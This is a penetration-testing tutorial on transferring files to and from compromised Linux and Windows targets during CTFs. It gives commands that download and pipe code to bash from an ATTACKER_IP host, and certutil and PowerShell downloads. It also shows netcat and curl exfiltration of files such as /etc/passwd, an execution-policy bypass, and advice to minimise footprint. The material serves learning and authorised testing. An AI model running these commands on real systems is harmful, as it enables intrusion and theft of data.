+++
title = 'Copy files to and from victim'
categories = ['Foothold']
date = "2025-12-15T20:51:00+01:00"
scrollToTop = true
+++

## Introduction

Transferring files to and from a compromised target is a fundamental skill in penetration testing and CTF challenges. Whether you need to upload enumeration scripts, exfiltrate data, or transfer exploits, understanding multiple file transfer techniques is crucial for different scenarios and target configurations.

This guide covers reliable methods for transferring files across both Linux and Windows systems, with practical examples using common enumeration scripts.

## Setting Up the Attack Machine (Kali Linux)

### Python HTTP Server

Python's built-in HTTP server is one of the most convenient ways to serve files from your attack machine. The command differs between Python 2 and Python 3:

**Python 2:**
```bash
python -m SimpleHTTPServer 1337
```

**Python 3:**
```bash
python3 -m http.server 1337
```

Both commands will serve files from your current directory on port 1337. You can specify any port you prefer.

**Pro tip:** Navigate to the directory containing your files before starting the server and list the directory:
```bash
cd /opt/useful-scripts
ls
python3 -m http.server 1337
```

## Receiving the file (Linux)

### Using wget

`wget` is the most straightforward method for downloading files on Linux systems. It's pre-installed on most distributions.

**Basic download:**
```bash
wget http://ATTACKER_IP:1337/LinEnum.sh
```

**Download to specific location:**
```bash
wget http://ATTACKER_IP:1337/LinEnum.sh -O /tmp/LinEnum.sh
```

**Download and execute directly (use with caution):**
```bash
wget http://ATTACKER_IP:1337/LinEnum.sh -O - | bash
```

### Using curl

If `wget` is not available, `curl` is an excellent alternative:

```bash
curl http://ATTACKER_IP:1337/LinEnum.sh -o /tmp/LinEnum.sh
```

**Execute directly:**
```bash
curl http://ATTACKER_IP:1337/LinEnum.sh | bash
```

### Complete Example: Downloading and Running LinEnum.sh

**On Kali (Attack Machine):**
```bash
# Navigate to your scripts directory
cd ~/tools/linux

# List directory (so you can easily read the file to transfer)
ls

# Start HTTP server
python3 -m http.server 1337
```

**On Linux Target:**
```bash
# Download LinEnum.sh
wget http://10.10.14.5:1337/LinEnum.sh

# Make it executable
chmod +x LinEnum.sh

# Run the script
./LinEnum.sh
```

---

## Receiving the file (Windows)

Windows file transfers can be more challenging, but several reliable methods exist.

### Using certutil (CMD)

`certutil` is a built-in Windows utility originally designed for certificate management, but it can download files from the internet.

**Basic syntax:**
```cmd
certutil -urlcache -f http://ATTACKER_IP:1337/LinEnum.sh LinEnum.sh
```

**Complete example with LinEnum.sh:**
```cmd
certutil -urlcache -f http://10.10.14.5:1337/LinEnum.sh C:\Temp\LinEnum.sh
```

**Advantages:**
- Pre-installed on Windows
- Works without PowerShell
- Available on older Windows versions

**Note:** While we're using LinEnum.sh as a consistent example, you'd typically transfer Windows-specific scripts like `PowerUp.ps1` or `winPEAS.exe` to Windows targets.

### Using PowerShell

PowerShell provides powerful and flexible file transfer capabilities.

**PowerShell 3.0+ (Invoke-WebRequest):**
```powershell
Invoke-WebRequest -Uri http://10.10.14.5:1337/LinEnum.sh -OutFile C:\Temp\LinEnum.sh
```

**Shorter alias:**
```powershell
iwr -Uri http://10.10.14.5:1337/LinEnum.sh -OutFile C:\Temp\LinEnum.sh
```

**PowerShell (DownloadFile method):**
```powershell
(New-Object System.Net.WebClient).DownloadFile("http://10.10.14.5:1337/LinEnum.sh", "C:\Temp\LinEnum.sh")
```

**One-liner from CMD:**
```cmd
powershell -c "Invoke-WebRequest -Uri http://10.10.14.5:1337/LinEnum.sh -OutFile C:\Temp\LinEnum.sh"
```

### Complete Windows Example

**On Kali (Attack Machine):**
```bash
# Navigate to your scripts directory
cd ~/tools/linux

# List directory (so you can easily read the file to transfer)
ls

# Start HTTP server
python3 -m http.server 1337
```

**On Windows Target (CMD):**
```cmd
# Create temp directory if it doesn't exist
mkdir C:\Temp

# Download using certutil
certutil -urlcache -f http://10.10.14.5:1337/script.exe C:\Temp\script.exe
```

**On Windows Target (PowerShell):**
```powershell
# Download using Invoke-WebRequest
Invoke-WebRequest -Uri http://10.10.14.5:1337/script.exe -OutFile C:\Temp\script.exe
```

---

## Exfiltrating Files from the Target

### From Linux Target to Kali

**Using netcat:**

On Kali:
```bash
nc -lvnp 1337 > exfiltrated_data.txt
```

On Linux target:
```bash
cat sensitive_file.txt | nc ATTACKER_IP 1337
```

**Using HTTP POST (if Python is available on target):**

On Kali (simple receiver):
```bash
python3 -m http.server 1337
```

On target:
```bash
curl -X POST -F "file=@/etc/passwd" http://ATTACKER_IP:1337/
```

### From Windows Target to Kali

**Using PowerShell and netcat:**

On Kali:
```bash
nc -lvnp 1337 > exfiltrated_data.txt
```

On Windows target:
```powershell
Get-Content C:\path\to\file.txt | & "C:\path\to\nc.exe" ATTACKER_IP 1337
```

---

## Bonus tip - Base64 encofing + Copy & Paste
Now here’s an interesting one. We won’t be actually transferring a file across a network, but instead we will be copy-pasting executable files from our attacking machine to the target. But how can we copy and paste executable files, which are full of unprintable characters?

The trick is by first encoding the file in Base 64. We can do this by using Python: 
```bash
python -c 'print(__import__("base64").b64encode(open("file", "rb").read()))'
```

Then, on the target, we can copy and paste the string into a .txt file with echo `"string" > output.txt`, and use base64 to decode the file, with 
```bash
base64 -d output.txt > output-file
```

## Best Practices

1. **Always verify file integrity:** Use checksums (MD5, SHA256) to ensure files weren't corrupted during transfer
   ```bash
   # On Kali
   md5sum LinEnum.sh
   
   # On Linux target
   md5sum LinEnum.sh
   ```

2. **Use appropriate directories:** Transfer files to world-writable directories like `/tmp`, `/var/tmp`, or `C:\Temp`

3. **Clean up after yourself:** Remove transferred files when done to minimize your footprint

4. **Consider firewall restrictions:** If outbound HTTP is blocked, try alternative ports (80, 443, 8080) or other protocols

5. **Test your setup:** Verify your HTTP server is accessible before attempting transfers

6. **Use HTTPS when possible:** For more sensitive operations, consider using HTTPS or encrypted channels

---

## Troubleshooting

**"Connection refused" errors:**
- Verify the HTTP server is running
- Check if you're using the correct IP address
- Ensure firewall rules allow the connection

**"Permission denied" errors:**
- Use writable directories like `/tmp`
- Check if you need elevated privileges

**PowerShell execution policy issues:**
- Try: `powershell -ExecutionPolicy Bypass -File script.ps1`

---

## Summary

File transfer is a critical skill in penetration testing. Master these core techniques:

- **Serving files:** Python HTTP server (Python 2 & 3)
- **Linux downloads:** `wget` and `curl`
- **Windows downloads:** `certutil` (CMD) and `Invoke-WebRequest` (PowerShell)
- **Exfiltration:** Netcat for receiving files

With these methods in your toolkit, you'll be able to transfer files reliably across various target systems and network configurations.
